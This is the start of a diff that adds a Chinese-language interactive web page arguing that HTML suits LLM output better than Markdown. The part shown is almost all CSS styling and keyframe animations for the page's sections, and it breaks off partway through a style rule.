@@ -1,0 +1,3144 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>HTML 的非理性优势：LLM 输出的范式转变</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+<style>
+:root {
+  --bg-act1: #F7FEE7;
+  --bg-act2: #FAF5FF;
+  --bg-act3: #ECFDF5;
+  --bg-dark: #0F172A;
+  --text: #1E293B;
+  --text-muted: #64748B;
+  --dim: #94A3B8;
+  --accent: #65A30D;
+  --accent2: #7E22CE;
+  --warm: #D97706;
+  --danger: #DC2626;
+  --neutral: #94A3B8;
+  --card-bg: #FFFFFF;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{margin:0;padding:0;height:100%;overflow:hidden;font-family:'Noto Sans SC',sans-serif;color:var(--text);-webkit-font-smoothing:antialiased;}
+.reveal{opacity:0;transform:translateY(40px);transition:opacity 0.8s ease,transform 0.8s ease;}
+.reveal.visible{opacity:1;transform:translateY(0);}
+.reveal-delay-1{transition-delay:0.15s;}
+.reveal-delay-2{transition-delay:0.3s;}
+.reveal-delay-3{transition-delay:0.45s;}
+.reveal-delay-4{transition-delay:0.6s;}
+.big-statement{font-family:'Noto Serif SC',serif;font-size:clamp(22px,5.5vw,32px);font-weight:700;line-height:1.5;margin-bottom:32px;}
+.body-text{font-size:16px;line-height:1.9;color:var(--text);margin-bottom:28px;}
+.body-text .hl{color:var(--accent);font-weight:500;}
+.body-text .hl2{color:var(--accent2);font-weight:500;}
+.body-text .hl-danger{color:var(--danger);font-weight:500;}
+.layer{position:fixed;inset:0;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;visibility:hidden;opacity:0;will-change:transform,opacity;scroll-snap-type:y proximity;}
+.layer.active{visibility:visible;opacity:1;}
+.feed-section{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:80px 24px;scroll-snap-align:start;}
+.feed-section.dark{background:var(--bg-dark);color:#F1F5F9;}
+.feed-section.dark .body-text{color:#94A3B8;}
+.feed-section.dark .big-statement{color:#F1F5F9;}
+.section-inner{max-width:600px;width:100%;}
+.breadcrumb{position:fixed;top:16px;left:16px;z-index:1000;display:flex;align-items:center;gap:4px;background:rgba(255,255,255,0.92);backdrop-filter:blur(12px);padding:8px 14px;border-radius:10px;box-shadow:0 2px 16px rgba(0,0,0,0.1);font-size:13px;font-weight:500;}
+.breadcrumb span{color:var(--text-muted);cursor:pointer;transition:color 0.2s;}
+.breadcrumb span:hover{color:var(--accent);}
+.breadcrumb span.current{color:var(--text);cursor:default;}
+.breadcrumb .sep{color:#CBD5E1;margin:0 2px;cursor:default;}
+.back-btn{position:fixed;top:16px;left:16px;z-index:1001;width:38px;height:38px;border-radius:10px;border:none;background:rgba(255,255,255,0.92);backdrop-filter:blur(12px);box-shadow:0 2px 12px rgba(0,0,0,0.1);font-size:18px;cursor:pointer;display:none;align-items:center;justify-content:center;color:var(--text);transition:all 0.2s;}
+.back-btn:hover{background:var(--accent);color:#fff;}
+.depth-dots{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);z-index:1000;display:flex;gap:8px;background:rgba(255,255,255,0.9);backdrop-filter:blur(8px);padding:8px 14px;border-radius:20px;box-shadow:0 2px 12px rgba(0,0,0,0.1);}
+.dot{width:10px;height:10px;border-radius:50%;background:#CBD5E1;transition:all 0.3s;}
+.dot.active{background:var(--accent);box-shadow:0 0 8px rgba(101,163,13,0.5);transform:scale(1.2);}
+.drill-btn{display:inline-flex;align-items:center;gap:6px;padding:10px 20px;border:1.5px solid rgba(101,163,13,0.3);border-radius:10px;background:transparent;color:var(--accent);font-size:14px;font-weight:600;cursor:pointer;transition:all 0.25s;}
+.drill-btn:hover{background:var(--accent);color:#fff;border-color:var(--accent);transform:translateY(-1px);box-shadow:0 4px 12px rgba(101,163,13,0.3);}
+.dark .drill-btn{border-color:rgba(101,163,13,0.4);}
+.source-panel{margin-top:24px;border-radius:12px;overflow:hidden;border:1px solid rgba(101,163,13,0.15);background:rgba(101,163,13,0.03);}
+.dark .source-panel{border-color:rgba(255,255,255,0.1);background:rgba(255,255,255,0.04);}
+.source-toggle{width:100%;padding:12px 16px;border:none;background:none;display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;font-weight:600;color:var(--accent);}
+.dark .source-toggle{color:#BEF264;}
+.source-toggle:hover{background:rgba(101,163,13,0.06);}
+.source-toggle .arrow{transition:transform 0.3s;font-size:11px;}
+.source-toggle.open .arrow{transform:rotate(90deg);}
+.source-body{max-height:0;overflow:hidden;transition:max-height 0.4s ease;padding:0 16px;}
+.source-body.open{max-height:2000px;padding:0 16px 16px;overflow-y:auto;}
+.source-body p{font-size:13px;line-height:1.8;color:var(--text-muted);margin:0 0 12px 0;white-space:pre-wrap;}
+.dark .source-body p{color:#94A3B8;}
+.source-body .source-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.05em;color:var(--accent);margin-bottom:8px;display:block;}
+.dark .source-body .source-label{color:#BEF264;}
+.anim-stage{width:100%;display:flex;justify-content:center;margin:28px 0;min-height:180px;}
+.anim-stage>div{width:100%;}
+.hook-line{font-size:14px;color:var(--accent);font-weight:500;margin:16px 0;line-height:1.7;}
+.dark .hook-line{color:#BEF264;}
+
+/* === S1 Animation === */
+
+/* ── S1 keyframes ── */
+@keyframes s1_fadeIn {
+  from { opacity: 0; transform: translateY(12px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+@keyframes s1_scaleIn {
+  from { transform: scale(0); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+@keyframes s1_bloomColor {
+  from { opacity: 0; transform: scale(0.5); }
+  to { opacity: 1; transform: scale(1); }
+}
+@keyframes s1_drawLine {
+  from { width: 0; }
+  to { width: 60px; }
+}
+@keyframes s1_arrowPulse {
+  0% { opacity: 0; transform: translateX(-8px); }
+  50% { opacity: 1; transform: translateX(0); }
+  100% { opacity: 1; transform: translateX(0); }
+}
+@keyframes s1_dimOut {
+  to { opacity: 0.35; filter: grayscale(0.6); }
+}
+@keyframes s1_textLine {
+  from { width: 0; opacity: 1; }
+  to { width: var(--tw); opacity: 1; }
+}
+@keyframes s1_iconPop {
+  0% { transform: scale(0) rotate(-15deg); opacity: 0; }
+  70% { transform: scale(1.15) rotate(3deg); opacity: 1; }
+  100% { transform: scale(1) rotate(0deg); opacity: 1; }
+}
+
+/* ── S1 stage ── */
+.s1_stage {
+  position: relative;
+  width: 340px;
+  height: 320px;
+  margin: 0 auto;
+  font-family: "Noto Sans SC", sans-serif;
+}
+
+/* ── Timeline arrow ── */
+.s1_timeline {
+  position: absolute;
+  top: 148px;
+  left: 112px;
+  display: flex;
+  align-items: center;
+  opacity: 0;
+}
+.s1_stage.visible .s1_timeline {
+  animation: s1_fadeIn 0.4s 1.2s forwards;
+}
+.s1_timeline_line {
+  height: 2px;
+  background: #1E293B;
+  opacity: 0;
+}
+.s1_stage.visible .s1_timeline_line {
+  animation: s1_drawLine 0.4s 1.6s forwards;
+}
+.s1_timeline_arrow {
+  font-size: 16px;
+  color: #1E293B;
+  margin-left: -2px;
+  opacity: 0;
+}
+.s1_stage.visible .s1_timeline_arrow {
+  animation: s1_arrowPulse 0.4s 2.0s forwards;
+}
+
+/* ── Left: Markdown doc ── */
+.s1_md_doc {
+  position: absolute;
+  top: 40px;
+  left: 16px;
+  width: 90px;
+  height: 120px;
+  background: #E2E8F0;
+  border-radius: 6px;
+  border: 2px solid #94A3B8;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding-top: 16px;
+  gap: 8px;
+  opacity: 0;
+}
+.s1_stage.visible .s1_md_doc {
+  animation: s1_scaleIn 0.5s 0.4s forwards;
+}
+.s1_stage.visible .s1_md_doc_dim {
+  animation: s1_dimOut 0.5s 2.8s forwards;
+}
+.s1_md_line {
+  height: 4px;
+  background: #94A3B8;
+  border-radius: 2px;
+  width: 0;
+  opacity: 0;
+}
+.s1_md_line1 { --tw: 50px; }
+.s1_md_line2 { --tw: 38px; }
+.s1_md_line3 { --tw: 55px; }
+.s1_md_line4 { --tw: 32px; }
+.s1_stage.visible .s1_md_line {
+  animation: s1_textLine 0.3s 0.9s forwards;
+}
+.s1_md_label {
+  position: absolute;
+  bottom: -28px;
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 13px;
+  font-weight: 600;
+  color: #94A3B8;
+  white-space: nowrap;
+}
+.s1_era_label {
+  position: absolute;
+  top: 14px;
+  font-size: 11px;
+  font-weight: 600;
+  color: #64748B;
+  white-space: nowrap;
+  opacity: 0;
+}
+.s1_era_left {
+  left: 30px;
+}
+.s1_era_right {
+  right: 30px;
+}
+.s1_stage.visible .s1_era_label {
+  animation: s1_fadeIn 0.3s 0.4s forwards;
+}
+
+/* ── Right: HTML doc ── */
+.s1_html_doc {
+  position: absolute;
+  top: 40px;
+  right: 16px;
+  width: 110px;
+  height: 120px;
+  background: #ECFDF5;
+  border-radius: 8px;
+  border: 2px solid #65A30D;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding-top: 10px;
+  gap: 4px;
+  opacity: 0;
+  overflow: hidden;
+}
+.s1_stage.visible .s1_html_doc {
+  animation: s1_bloomColor 0.5s 2.4s forwards;
+}
+.s1_html_label {
+  position: absolute;
+  bottom: -28px;
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 13px;
+  font-weight: 700;
+  color: #65A30D;
+  white-space: nowrap;
+}
+
+/* Mini SVG chart inside HTML doc */
+.s1_mini_chart {
+  width: 80px;
+  height: 28px;
+  opacity: 0;
+}
+.s1_stage.visible .s1_mini_chart {
+  animation: s1_bloomColor 0.3s 2.8s forwards;
+}
+/* Mini toggle inside HTML doc */
+.s1_mini_toggle {
+  width: 32px;
+  height: 14px;
+  background: #65A30D;
+  border-radius: 7px;
+  position: relative;
+  opacity: 0;
+}
+.s1_mini_toggle::after {
+  content: "";
+  position: absolute;
+  top: 2px;
+  right: 2px;
+  width: 10px;
+  height: 10px;
+  background: #fff;
+  border-radius: 50%;
+}
+.s1_stage.visible .s1_mini_toggle {
+  animation: s1_bloomColor 0.3s 3.0s forwards;
+}
+/* Mini nav dots inside HTML doc */
+.s1_mini_nav {
+  display: flex;
+  gap: 4px;
+  opacity: 0;
+}
+.s1_mini_nav_dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: #7E22CE;
+}
+.s1_mini_nav_dot:first-child {
+  background: #65A30D;
+}
+.s1_stage.visible .s1_mini_nav {
+  animation: s1_bloomColor 0.3s 3.2s forwards;
+}
+
+/* ── Bottom: Three superpowers ── */
+.s1_powers {
+  position: absolute;
+  bottom: 16px;
+  left: 0;
+  width: 100%;
+  display: flex;
+  justify-content: center;
+  gap: 20px;
+}
+.s1_power {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 6px;
+  opacity: 0;
+}
+.s1_power_icon {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 13px;
+  font-weight: 700;
+  color: #fff;
+}
+.s1_power_icon_svg { background: #65A30D; }
+.s1_power_icon_widget { background: #7E22CE; }
+.s1_power_icon_nav { background: #1E293B; }
+
+.s1_power_text {
+  font-size: 11px;
+  font-weight: 600;
+  color: #1E293B;
+  white-space: nowrap;
+}
+
+.s1_stage.visible .s1_power:nth-child(1) {
+  animation: s1_iconPop 0.5s 3.6s forwards;
+}
+.s1_stage.visible .s1_power:nth-child(2) {
+  animation: s1_iconPop 0.5s 4.0s forwards;
+}
+.s1_stage.visible .s1_power:nth-child(3) {
+  animation: s1_iconPop 0.5s 4.4s forwards;
+}
+
+/* === S2 Animation === */
+
+.s2_stage {
+  width: 340px;
+  margin: 0 auto;
+  padding: 24px 20px;
+  background: #0F172A;
+  border-radius: 12px;
+  font-family: -apple-system, "Helvetica Neue", Arial, sans-serif;
+  color: #E2E8F0;
+  overflow: hidden;
+}
+
+/* Budget bar at top */
+.s2_budget {
+  margin-bottom: 20px;
+  opacity: 0;
+}
+.s2_stage.visible .s2_budget {
+  animation: s2_fadeIn 0.5s 0.4s both;
+}
+.s2_budget_label {
+  font-size: 11px;
+  color: #94A3B8;
+  margin-bottom: 6px;
+  display: flex;
+  justify-content: space-between;
+}
+.s2_budget_track {
+  height: 10px;
+  background: #1E293B;
+  border-radius: 5px;
+  overflow: hidden;
+  position: relative;
+}
+.s2_budget_fill {
+  height: 100%;
+  width: 100%;
+  background: linear-gradient(90deg, #65A30D, #7E22CE);
+  border-radius: 5px;
+  transform-origin: right center;
+}
+.s2_stage.visible .s2_budget_fill {
+  animation: s2_deplete 3s 0.9s both;
+}
+@keyframes s2_deplete {
+  0% { width: 100%; }
+  30% { width: 78%; }
+  60% { width: 52%; }
+  100% { width: 31%; }
+}
+
+/* Column headers */
+.s2_headers {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 14px;
+  opacity: 0;
+}
+.s2_stage.visible .s2_headers {
+  animation: s2_fadeIn 0.4s 0.7s both;
+}
+.s2_hdr {
+  font-size: 12px;
+  font-weight: 600;
+  width: 48%;
+  text-align: center;
+  padding: 4px 0;
+  border-radius: 4px;
+}
+.s2_hdr_md {
+  color: #65A30D;
+  border: 1px solid #65A30D33;
+  background: #65A30D11;
+}
+.s2_hdr_html {
+  color: #7E22CE;
+  border: 1px solid #7E22CE33;
+  background: #7E22CE11;
+}
+
+/* Comparison rows */
+.s2_row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 12px;
+  opacity: 0;
+}
+.s2_stage.visible .s2_row:nth-child(1) {
+  animation: s2_fadeIn 0.4s 1.2s both;
+}
+.s2_stage.visible .s2_row:nth-child(2) {
+  animation: s2_fadeIn 0.4s 1.8s both;
+}
+.s2_stage.visible .s2_row:nth-child(3) {
+  animation: s2_fadeIn 0.4s 2.4s both;
+}
+.s2_stage.visible .s2_row:nth-child(4) {
+  animation: s2_fadeIn 0.4s 3.0s both;
+}
+
+.s2_col {
+  width: 48%;
+}
+.s2_row_label {
+  font-size: 10px;
+  color: #94A3B8;
+  margin-bottom: 3px;
+  text-align: center;
+}
+.s2_bar_wrap {
+  height: 22px;
+  background: #1E293B;
+  border-radius: 4px;
+  overflow: hidden;
+  position: relative;
+  display: flex;
+  align-items: center;
+}
+.s2_bar {
+  height: 100%;
+  border-radius: 4px;
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+  padding-right: 6px;
+  font-size: 10px;
+  font-weight: 600;
+  color: #fff;
+  width: 0;
+}
+.s2_bar_md {
+  background: #65A30D;
+}
+.s2_bar_html {
+  background: #7E22CE;
+}
+
+/* Animate bar widths per row */
+.s2_stage.visible .s2_row:nth-child(1) .s2_bar_md {
+  animation: s2_barGrow_md1 0.6s 1.5s both;
+}
+.s2_stage.visible .s2_row:nth-child(1) .s2_bar_html {
+  animation: s2_barGrow_html1 0.6s 1.5s both;
+}
+.s2_stage.visible .s2_row:nth-child(2) .s2_bar_md {
+  animation: s2_barGrow_md2 0.6s 2.1s both;
+}
+.s2_stage.visible .s2_row:nth-child(2) .s2_bar_html {
+  animation: s2_barGrow_html2 0.6s 2.1s both;
+}
+.s2_stage.visible .s2_row:nth-child(3) .s2_bar_md {
+  animation: s2_barGrow_md3 0.6s 2.7s both;
+}
+.s2_stage.visible .s2_row:nth-child(3) .s2_bar_html {
+  animation: s2_barGrow_html3 0.6s 2.7s both;
+}
+.s2_stage.visible .s2_row:nth-child(4) .s2_bar_md {
+  animation: s2_barGrow_md4 0.6s 3.3s both;
+}
+.s2_stage.visible .s2_row:nth-child(4) .s2_bar_html {
+  animation: s2_barGrow_html4 0.6s 3.3s both;
+}
+
+/* Heading: 3 vs 7 tokens */
+@keyframes s2_barGrow_md1 { to { width: 30%; } }
+@keyframes s2_barGrow_html1 { to { width: 70%; } }
+
+/* List: 1 vs 5 tokens */
+@keyframes s2_barGrow_md2 { to { width: 20%; } }
+@keyframes s2_barGrow_html2 { to { width: 65%; } }
+
+/* Code block: 3 vs 8 tokens */
+@keyframes s2_barGrow_md3 { to { width: 28%; } }
+@keyframes s2_barGrow_html3 { to { width: 75%; } }
+
+/* Bold: 2 vs 6 tokens */
+@keyframes s2_barGrow_md4 { to { width: 22%; } }
+@keyframes s2_barGrow_html4 { to { width: 68%; } }
+
+/* Syntax preview */
+.s2_syntax {
+  font-family: "SF Mono", "Consolas", monospace;
+  font-size: 9px;
+  color: #94A3B8;
+  text-align: center;
+  margin-bottom: 2px;
+  letter-spacing: -0.3px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+/* Verdict badge */
+.s2_verdict {
+  margin-top: 18px;
+  text-align: center;
+  opacity: 0;
+}
+.s2_stage.visible .s2_verdict {
+  animation: s2_fadeIn 0.5s 3.8s both;
+}
+.s2_verdict_badge {
+  display: inline-block;
+  background: #65A30D22;
+  border: 1px solid #65A30D55;
+  color: #65A30D;
+  font-size: 12px;
+  font-weight: 600;
+  padding: 6px 16px;
+  border-radius: 20px;
+}
+.s2_verdict_sub {
+  font-size: 10px;
+  color: #94A3B8;
+  margin-top: 6px;
+}
+
+@keyframes s2_fadeIn {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* === S3 Animation === */
+
+/* === S3: HTML 的三大超能力 === */
+.s3_stage {
+  position: relative;
+  width: 340px;
+  max-width: 90vw;
+  height: 520px;
+  margin: 0 auto;
+  font-family: -apple-system, 'Helvetica Neue', 'PingFang SC', sans-serif;
+}
+
+/* --- Card base --- */
+.s3_card {
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%) scale(0);
+  width: 280px;
+  height: 120px;
+  border-radius: 14px;
+  background: #fff;
+  border: 2px solid #E2E8F0;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  padding: 0 20px;
+  opacity: 0;
+}
+.s3_card1 { top: 10px; }
+.s3_card2 { top: 180px; }
+.s3_card3 { top: 350px; }
+
+/* --- Icon containers --- */
+.s3_icon {
+  width: 56px;
+  height: 56px;
+  border-radius: 12px;
+  flex-shrink: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  overflow: hidden;
+}
+.s3_icon1 { background: rgba(101,163,13,0.12); }
+.s3_icon2 { background: rgba(126,34,206,0.12); }
+.s3_icon3 { background: rgba(101,163,13,0.12); }
+
+/* --- Card text --- */
+.s3_label {
+  font-size: 15px;
+  font-weight: 700;
+  color: #1E293B;
+  line-height: 1.4;
+}
+.s3_sublabel {
+  font-size: 12px;
+  color: #64748B;
+  margin-top: 4px;
+  line-height: 1.5;
+}
+
+/* === Card 1: SVG mini bar chart === */
+.s3_bar {
+  width: 8px;
+  border-radius: 3px 3px 0 0;
+  position: absolute;
+  bottom: 12px;
+  background: #65A30D;
+  height: 0;
+}
+.s3_bar1 { left: 10px; }
+.s3_bar2 { left: 22px; }
+.s3_bar3 { left: 34px; }
+
+/* === Card 2: Toggle switch === */
+.s3_toggle_track {
+  width: 36px;
+  height: 20px;
+  border-radius: 10px;
+  background: #CBD5E1;
+  position: relative;
+  transition: background 0.3s;
+}
+.s3_toggle_knob {
+  width: 16px;
+  height: 16px;
+  border-radius: 50%;
+  background: #fff;
+  position: absolute;
+  top: 2px;
+  left: 2px;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+}
+
+/* === Card 3: Nav sitemap dots === */
+.s3_nav_wrap {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 4px;
+  position: relative;
+}
+.s3_nav_dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: #CBD5E1;
+}
+.s3_nav_line {
+  width: 2px;
+  height: 8px;
+  background: #CBD5E1;
+}
+.s3_nav_branch {
+  display: flex;
+  gap: 12px;
+}
+
+/* === Connector lines between cards === */
+.s3_conn {
+  position: absolute;
+  left: 50%;
+  width: 2px;
+  background: #E2E8F0;
+  transform: translateX(-50%);
+  height: 0;
+}
+.s3_conn1 { top: 130px; }
+.s3_conn2 { top: 300px; }
+
+/* === Keyframes === */
+@keyframes s3_cardIn {
+  from { transform: translateX(-50%) scale(0.85); opacity: 0; }
+  to { transform: translateX(-50%) scale(1); opacity: 1; }
+}
+@keyframes s3_connGrow {
+  from { height: 0; }
+  to { height: 50px; }
+}
+@keyframes s3_barGrow1 { to { height: 18px; } }
+@keyframes s3_barGrow2 { to { height: 30px; } }
+@keyframes s3_barGrow3 { to { height: 24px; } }
+
+@keyframes s3_toggleSlide {
+  0% { left: 2px; }
+  100% { left: 18px; }
+}
+@keyframes s3_toggleColor {
+  to { background: #7E22CE; }
+}
+@keyframes s3_navPulse {
+  0% { background: #CBD5E1; }
+  50% { background: #65A30D; }
+  100% { background: #65A30D; }
+}
+@keyframes s3_cardGlow1 {
+  to { border-color: #65A30D; box-shadow: 0 4px 20px rgba(101,163,13,0.15); }
+}
+@keyframes s3_cardGlow2 {
+  to { border-color: #7E22CE; box-shadow: 0 4px 20px rgba(126,34,206,0.15); }
+}
+@keyframes s3_cardGlow3 {
+  to { border-color: #65A30D; box-shadow: 0 4px 20px rgba(101,163,13,0.15); }
+}
+
+/* === Timeline: triggered by .visible === */
+.s3_stage.visible .s3_card1 {
+  animation: s3_cardIn 0.5s 0.4s cubic-bezier(0.34,1.56,0.64,1) forwards;
+}
+.s3_stage.visible .s3_card1 .s3_bar1 {
+  animation: s3_barGrow1 0.4s 1.0s ease-out forwards;
+}
+.s3_stage.visible .s3_card1 .s3_bar2 {
+  animation: s3_barGrow2 0.4s 1.15s ease-out forwards;
+}
+.s3_stage.visible .s3_card1 .s3_bar3 {
+  animation: s3_barGrow3 0.4s 1.3s ease-out forwards;
+}
+.s3_stage.visible .s3_card1 {
+  animation: s3_cardIn 0.5s 0.4s cubic-bezier(0.34,1.56,0.64,1) forwards,
+             s3_cardGlow1 0.4s 1.5s ease-out forwards;
+}
+
+.s3_stage.visible .s3_conn1 {
+  animation: s3_connGrow 0.3s 1.8s ease-out forwards;
+}
+
+.s3_stage.visible .s3_card2 {
+  animation: s3_cardIn 0.5s 2.2s cubic-bezier(0.34,1.56,0.64,1) forwards,
+             s3_cardGlow2 0.4s 3.0s ease-out forwards;
+}
+.s3_stage.visible .s3_card2 .s3_toggle_knob {
+  animation: s3_toggleSlide 0.4s 2.8s ease-out forwards;
+}
+.s3_stage.visible .s3_card2 .s3_toggle_track {
+  animation: s3_toggleColor 0.3s 2.8s ease-out forwards;
+}
+
+.s3_stage.visible .s3_conn2 {
+  animation: s3_connGrow 0.3s 3.3s ease-out forwards;
+}
+
+.s3_stage.visible .s3_card3 {
+  animation: s3_cardIn 0.5s 3.7s cubic-bezier(0.34,1.56,0.64,1) forwards,
+             s3_cardGlow3 0.4s 4.5s ease-out forwards;
+}
+.s3_stage.visible .s3_card3 .s3_nav_dot {
+  animation: s3_navPulse 0.6s 4.2s ease-out forwards;
+}
+
+/* === S4 Animation === */
+
+.s4_stage {
+  width: 340px;
+  margin: 0 auto;
+  padding: 24px 20px;
+  background: #0F172A;
+  border-radius: 16px;
+  font-family: -apple-system, "Segoe UI", sans-serif;
+  color: #E2E8F0;
+  overflow: hidden;
+}
+
+.s4_card {
+  background: #1E293B;
+  border-radius: 10px;
+  border: 1px solid #334155;
+  overflow: hidden;
+  opacity: 0;
+}
+
+.s4_stage.visible .s4_card {
+  animation: s4_cardIn 0.5s ease-out 0.4s forwards;
+}
+
+@keyframes s4_cardIn {
+  from { opacity: 0; transform: translateY(12px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.s4_header {
+  padding: 10px 14px;
+  background: #334155;
+  font-size: 12px;
+  font-weight: 600;
+  color: #94A3B8;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  letter-spacing: 0.02em;
+}
+
+.s4_dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: #7E22CE;
+  flex-shrink: 0;
+}
+
+.s4_diff {
+  padding: 6px 0;
+  font-family: "SF Mono", "Consolas", monospace;
+  font-size: 11px;
+  line-height: 1.1;
+}
+
+.s4_line {
+  display: flex;
+  align-items: center;
+  padding: 3px 14px;
+  gap: 8px;
+  opacity: 0;
+  position: relative;
+}
+
+.s4_stage.visible .s4_line:nth-child(1) { animation: s4_lineIn 0.3s ease-out 0.8s forwards; }
+.s4_stage.visible .s4_line:nth-child(2) { animation: s4_lineIn 0.3s ease-out 1.0s forwards; }
+.s4_stage.visible .s4_line:nth-child(3) { animation: s4_lineIn 0.3s ease-out 1.2s forwards; }
+.s4_stage.visible .s4_line:nth-child(4) { animation: s4_lineIn 0.3s ease-out 1.4s forwards; }
+.s4_stage.visible .s4_line:nth-child(5) { animation: s4_lineIn 0.3s ease-out 1.6s forwards; }
+.s4_stage.visible .s4_line:nth-child(6) { animation: s4_lineIn 0.3s ease-out 1.8s forwards; }
+
+@keyframes s4_lineIn {
+  from { opacity: 0; transform: translateX(-8px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+
+.s4_gutter {
+  width: 18px;
+  text-align: right;
+  color: #475569;
+  font-size: 10px;
+  flex-shrink: 0;
+  user-select: none;
+}
+
+.s4_code {
+  flex: 1;
+  white-space: nowrap;
+  overflow: hidden;
+}
+
+.s4_line--add {
+  background: rgba(101, 163, 13, 0.08);
+  border-left: 2px solid #65A30D;
+}
+
+.s4_line--del {
+  background: rgba(220, 38, 38, 0.08);
+  border-left: 2px solid #DC2626;
+}
+
+.s4_line--ctx {
+  border-left: 2px solid transparent;
+}
+
+.s4_prefix--add { color: #65A30D; }
+.s4_prefix--del { color: #DC2626; }
+.s4_prefix--ctx { color: #475569; }
+
+.s4_annotations {
+  padding: 8px 14px 12px;
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+  border-top: 1px solid #1E293B;
+}
+
+.s4_anno {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  opacity: 0;
+  font-size: 11px;
+  color: #94A3B8;
+  padding: 6px 10px;
+  border-radius: 6px;
+  background: rgba(15, 23, 42, 0.6);
+}
+
+.s4_stage.visible .s4_anno--danger {
+  animation: s4_badgePop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) 2.2s forwards;
+}
+
+.s4_stage.visible .s4_anno--warn {
+  animation: s4_badgePop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) 2.7s forwards;
+}
+
+.s4_stage.visible .s4_anno--ok {
+  animation: s4_badgePop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) 3.2s forwards;
+}
+
+@keyframes s4_badgePop {
+  0% { opacity: 0; transform: scale(0.6) translateX(-6px); }
+  70% { transform: scale(1.05) translateX(0); }
+  100% { opacity: 1; transform: scale(1) translateX(0); }
+}
+
+.s4_badge {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 4px;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 0.04em;
+  flex-shrink: 0;
+  text-align: center;
+  min-width: 36px;
+}
+
+.s4_badge--danger {
+  background: #DC2626;
+  color: #FFF;
+}
+
+.s4_badge--warn {
+  background: #D97706;
+  color: #FFF;
+}
+
+.s4_badge--ok {
+  background: #65A30D;
+  color: #FFF;
+}
+
+.s4_anno-text {
+  flex: 1;
+  line-height: 1.3;
+}
+
+.s4_anno-line {
+  color: #64748B;
+  font-size: 10px;
+  flex-shrink: 0;
+}
+
+.s4_title {
+  text-align: center;
+  font-size: 13px;
+  font-weight: 600;
+  color: #CBD5E1;
+  margin-bottom: 14px;
+  opacity: 0;
+}
+
+.s4_stage.visible .s4_title {
+  animation: s4_fadeIn 0.4s ease-out 0.4s forwards;
+}
+
+@keyframes s4_fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+.s4_caption {
+  text-align: center;
+  font-size: 11px;
+  color: #64748B;
+  margin-top: 14px;
+  opacity: 0;
+}
+
+.s4_stage.visible .s4_caption {
+  animation: s4_fadeIn 0.5s ease-out 3.6s forwards;
+}
+
+.s4_connector {
+  width: 1px;
+  height: 8px;
+  background: #334155;
+  margin: 0 auto;
+  opacity: 0;
+}
+
+.s4_stage.visible .s4_connector {
+  animation: s4_fadeIn 0.3s ease-out 2.0s forwards;
+}
+
+/* === S5 Animation === */
+
+.s5_stage {
+  width: 340px;
+  height: 340px;
+  background: #F7FEE7;
+  border-radius: 18px;
+  position: relative;
+  overflow: hidden;
+  font-family: -apple-system, "Helvetica Neue", Arial, sans-serif;
+}
+
+.s5_counter_wrap {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  text-align: center;
+  z-index: 2;
+}
+
+.s5_counter_label {
+  font-size: 12px;
+  color: #7E22CE;
+  font-weight: 600;
+  opacity: 0;
+  margin-top: 2px;
+}
+
+.s5_stage.visible .s5_counter_label {
+  animation: s5_fade_in 0.4s ease-out 3s forwards;
+}
+
+.s5_counter_scroll {
+  height: 52px;
+  overflow: hidden;
+  position: relative;
+}
+
+.s5_counter_tape {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.s5_counter_tape span {
+  font-size: 42px;
+  font-weight: 800;
+  color: #65A30D;
+  line-height: 52px;
+  display: block;
+  height: 52px;
+}
+
+.s5_stage.visible .s5_counter_tape {
+  animation: s5_scroll_up 2.2s cubic-bezier(0.22, 1, 0.36, 1) 0.4s forwards;
+}
+
+.s5_grid {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  grid-template-rows: 1fr 1fr;
